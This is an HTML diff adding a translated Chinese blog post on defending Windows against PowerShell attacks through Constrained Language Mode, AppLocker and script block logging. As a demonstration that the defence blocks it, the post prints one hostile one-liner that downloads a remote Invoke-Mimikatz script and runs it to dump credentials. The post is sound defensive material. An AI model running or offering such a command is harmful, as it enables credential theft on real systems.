@@ -179,6 +179,136 @@
             
 
   
+    <article id="post-ways-to-detect-and-mitigate-powershell-attacks" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class=" article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	      <a class="article-title" href="/2019/09/26/ways-to-detect-and-mitigate-powershell-attacks/" target="_blank">检测和缓解PowerShell攻击的方法</a>
+        
+    </h1>
+  
+
+
+  
+  
+<a href="/2019/09/26/ways-to-detect-and-mitigate-powershell-attacks/" class="archive-article-date">
+        <time datetime="2019-09-26T13:18:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-26</time>
+</a>
+
+  
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p><strong>声明：本文档由12306Bro个人业余时间翻译，个人行为与公司无任何关系！译文来源<a href="https://blog.stealthbits.com/" target="_blank" rel="noopener">INSIDER THREAT SECURITY BLOG</a>博客站相关文档。如您对翻译文档内容有异议，请将原文文档做为主要参考，原文版权由博客站及其相关成员持有并保留。翻译文章禁止用于任何商业用途，仅供交流与学习。</strong></p>
+<hr>
+<p>PowerShell已经发展成为针对windows系统攻击的主要方式之一，是攻击者使用本机工具攻击的一种方式。对此，我们研究了Empire，DeathStar和CrackMapExec以及这些工具是如何利用PowerShell调用Mimikatz并发起其他攻击的。在本文中，我们讲探讨如何检测和防御PowerShell攻击。</p>
+<h2 id="PowerShell有何优点？"><a href="#PowerShell有何优点？" class="headerlink" title="PowerShell有何优点？"></a>PowerShell有何优点？</h2><p>近些年来，攻击者偏爱PS的原因有很多，比如：</p>
+<ul>
+<li>默认情况下windows系统均有安装；</li>
+<li>它可以从内存执行命令，无需将任何内容写入磁盘，这使得检测起来极其困难；</li>
+<li>它可以启动与其他系统的远程连接；</li>
+<li>GitHub和其他地方（例如Invoke-Mimikatz）上有很多脚本可供攻击者使用；</li>
+<li>管理员也需要使用它，因此几乎完全不会禁用它；</li>
+<li>很难从恶意PowerShell中分辨出正常的PowerShell；</li>
+</ul>
+<p>拥有所有这些好处，作为防御者，我们需要更加重视PowerShell并学习如何保护它。让我们看一些方法。</p>
+<h2 id="约束语言模式"><a href="#约束语言模式" class="headerlink" title="约束语言模式"></a>约束语言模式</h2><p>Windows PowerShell支持各种语言模式。这些语言模式确定可以使用和不能使用PowerShell的哪些部分以及它们如何与Windows交互。针对Surface RT上的Windows RT操作系统开发了约束语言模式。最终，它被添加到Windows PowerShell V5中，并且可以在现代Windows操作系统上使用。</p>
+<p>虽然有多种启用约束语言的方法，例如以允许模式启用AppLocker，但最简单的方法是设置环境变量__ <em>PSLockdownPolicy</em>，这可以通过简单的脚本来完成。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; [Environment]::SetEnvironmentVariable(&apos;__PSLockdownPolicy&apos;,&apos;4&apos;, &apos;Machine&apos;)</span><br><span class="line">PS C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本后，你可以尝试启动一个新的PowerShell窗口并执行相关命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>
+
+<p>你可以看到你现在处于“约束语言”模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Xinli&gt; $ExecutionContext.SessionState.LanguageMode</span><br><span class="line">ConstrainedLanguage</span><br><span class="line">PS C:\Users\Xinli&gt;</span><br></pre></td></tr></table></figure>
+
+<p>启用约束语言模式后，运行诸如Invoke-Mimikatz之类的恶意脚本将不再起作用： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Xinli\Desktop\drunkenkatz&gt; Import-Module .\Invoke-Mimikatz.orig.ps1</span><br><span class="line">Import-Module : 在 ConstrainedLanguage 模式下不允许将 *.ps1 文件作为模块导入。</span><br><span class="line">所在位置 行:1 字符: 1</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-Mimikatz.orig.ps1</span><br><span class="line"></span><br><span class="line">CategoryInfo          : PermissionDenied: (:) [Import-Module], InvalidOperationException</span><br><span class="line"></span><br><span class="line">FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.Import</span><br><span class="line">ModuleCommand</span><br></pre></td></tr></table></figure>
+
+<p>即使使用再狡猾的技术，例如<a href="http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html" target="_blank" rel="noopener">此处</a>描述的从URL下载Invoke- Mimikatz的技术，也将被阻止：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Xinli\Desktop\drunkenkatz&gt; powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br><span class="line">New-Object : 无法创建类型。此语言模式仅支持核心类型。</span><br><span class="line">所在位置 行:1 字符: 6</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); ...</span><br><span class="line"></span><br><span class="line">CategoryInfo          : PermissionDenied: (:) [New-Object], PSNotSupportedException</span><br><span class="line"></span><br><span class="line">FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand</span><br><span class="line"></span><br><span class="line">Invoke-Mimikatz : 无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括</span><br><span class="line">路径，请确保路径正确，然后再试一次。</span><br><span class="line">所在位置 行:1 字符: 71</span><br><span class="line"></span><br><span class="line">... lient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCr ...</span><br><span class="line"></span><br><span class="line">CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], CommandNotFoundException</span><br><span class="line"></span><br><span class="line">FullyQualifiedErrorId : CommandNotFoundException</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用AppLocker禁用PowerShell和脚本"><a href="#使用AppLocker禁用PowerShell和脚本" class="headerlink" title="使用AppLocker禁用PowerShell和脚本"></a>使用AppLocker禁用PowerShell和脚本</h2><p>AppLocker随Windows 10 Enterprise一起提供，并提供了一种将应用程序和脚本列入白名单的有用方法。可以在系统上本地配置，也可以通过组策略配置。</p>
+<p>创建AppLocker策略时，可以将它们应用于文件，可执行文件，脚本和打包的应用程序。有关每个方面的详细信息，请<a href="https://technet.microsoft.com/en-us/library/hh831409(v=ws.11).aspx" target="_blank" rel="noopener">参阅TechNet上的有用信息</a>。</p>
+<p>出于安全的目的，你可以使用脚本规则策略，使用简单的PowerShell脚本为指定文件夹创建允许规则。这将确保只能执行此文件夹中的文件。</p>
+<p>您还可以使用可执行规则来限制可以通过文件路径或签名执行的文件。如果为PowerShell和PowerShell_ISE创建签名规则，则可以限制非管理员以这种方式运行PowerShell。应当指出，这很容易被攻击者绕开，因为正如我们在PowerShell Empire工具中看到的那样，可以在没有PowerShell.exe的情况下运行PowerShell。 PowerShell的团队提供了一个关于PowerShell的蓝队手册，请参与<a href="https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/" target="_blank" rel="noopener">这里</a>。</p>
+<h2 id="使用脚本块日志记录检测恶意PowerShell"><a href="#使用脚本块日志记录检测恶意PowerShell" class="headerlink" title="使用脚本块日志记录检测恶意PowerShell"></a>使用脚本块日志记录检测恶意PowerShell</h2><p>PowerShell V5引入了几种跟踪恶意PowerShell的新方法。在这篇文章中重点介绍的是脚本块记录。默认情况下，PowerShell V5会启用此级别的日志记录，并提供由PowerShell执行的完整脚本的明文日志记录。这很有用，因为许多攻击将利用难以破解的编码脚本。</p>
+<p>此处因能力有限，未做复现，大致讲一下思路。即利用Out-EncodedCommand进行Base-64编码并为PowerShell有效负载脚本生成命令行输出。<strong>但是，PowerShell事件日志仍然可以准确地看到我们运行的内容，而无需进行任何编码。</strong> </p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><strong>原文</strong>检测和缓解PowerShell攻击的方法：<a href="https://blog.stealthbits.com/ways-to-detect-and-mitigate-powershell-attacks" target="_blank" rel="noopener">https://blog.stealthbits.com/ways-to-detect-and-mitigate-powershell-attacks</a></p>
+<p>一句powershell调用mimikatz抓密码：<a href="https://www.waitalone.cn/powershell-mimikatz.html" target="_blank" rel="noopener">https://www.waitalone.cn/powershell-mimikatz.html</a></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">终端日志分析</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/威胁狩猎//" class="article-tag-list-link color5">威胁狩猎</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2019/09/26/ways-to-detect-and-mitigate-powershell-attacks/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-five-challenges-with-monitoring-active-directory-security-using-event-logs" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
